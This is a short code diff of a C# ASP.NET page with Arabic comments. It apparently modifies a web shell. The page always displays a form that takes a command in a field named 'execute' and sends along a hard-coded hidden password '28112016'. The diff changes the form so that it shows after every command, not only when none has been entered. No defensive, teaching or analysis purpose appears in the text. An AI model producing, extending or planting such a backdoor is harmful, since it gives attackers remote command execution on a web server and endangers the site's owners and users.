@@ -45,17 +45,15 @@
                     }
                 }
             }
-            else
-            {
-                // إذا لم يتم إدخال أمر، اعرض النموذج لإدخال الأمر
-                Response.Write(@"
-                    <form method='get'>
-                        Command: <input type='text' name='execute' />
-                        <input type='hidden' name='password' value='28112016' />
-                        <input type='submit' value='Execute' />
-                    </form>
-                ");
-            }
+
+            // عرض النموذج لإدخال أوامر إضافية
+            Response.Write(@"
+                <form method='get'>
+                    Command: <input type='text' name='execute' />
+                    <input type='hidden' name='password' value='28112016' />
+                    <input type='submit' value='Execute' />
+                </form>
+            ");
         }
         else
         {
